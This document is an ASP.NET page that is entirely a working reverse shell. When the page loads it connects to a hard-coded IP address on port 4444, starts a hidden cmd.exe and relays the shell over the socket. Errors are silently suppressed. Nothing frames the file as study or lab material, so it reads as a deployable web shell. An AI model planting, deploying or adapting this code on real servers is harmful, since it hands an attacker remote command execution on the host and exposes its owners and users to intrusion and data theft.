<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string host = "10.119.115.157";
        int port = 4444;

        try
        {
            TcpClient client = new TcpClient(host, port);
            NetworkStream stream = client.GetStream();

            new Thread(delegate()
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += (s, a) =>
                {
                    byte[] outBuf = System.Text.Encoding.ASCII.GetBytes(a.Data + "\n");
                    stream.Write(outBuf, 0, outBuf.Length);
                };
                p.ErrorDataReceived += (s, a) =>
                {
                    byte[] errBuf = System.Text.Encoding.ASCII.GetBytes(a.Data + "\n");
                    stream.Write(errBuf, 0, errBuf.Length);
                };
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                byte[] buf = new byte[1024];
                int n;
                while ((n = stream.Read(buf, 0, buf.Length)) > 0)
                {
                    string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, n);
                    p.StandardInput.WriteLine(cmd.Trim());
                }
                p.Kill();
                client.Close();
            }).Start();
        }
        catch (Exception) { }
    }
</script>
